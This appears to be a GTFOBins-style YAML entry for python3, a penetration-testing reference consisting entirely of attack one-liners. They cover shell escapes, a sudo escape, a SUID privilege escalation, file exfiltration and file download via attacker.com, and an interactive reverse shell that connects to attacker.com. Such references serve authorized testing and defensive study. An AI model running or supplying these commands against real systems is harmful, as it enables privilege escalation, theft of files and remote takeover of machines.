---
functions:
  execute-interactive:
    - code: python3 -c 'import os; os.system("/bin/sh")'
  sudo-enabled:
    - code: sudo python3 -c 'import os; os.system("/bin/sh")'
  suid-enabled:
    - code: ./python3 -c 'import os; os.system("/bin/sh -p")'
  upload:
    - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export URL=http://attacker.com/
        export LFILE=file_to_send
        python3 -c 'import urllib.request as r,urllib.parse as u;from os import environ as e; r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
    - description: Serve files in the local folder running an HTTP server.
      code: |
        LPORT=8888
        python3 -m http.server $LPORT
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=where_to_save
        python3 -c 'import urllib.request as u;from os import environ as e; u.urlretrieve (e["URL"], e["LFILE"])'
  reverse-shell-interactive:
    - description: Run <code>socat file:`tty`,raw,echo=0 tcp-listen:12345</code> on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        python3 -c 'import sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")'
  load-library:
    - code: python3 -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
---
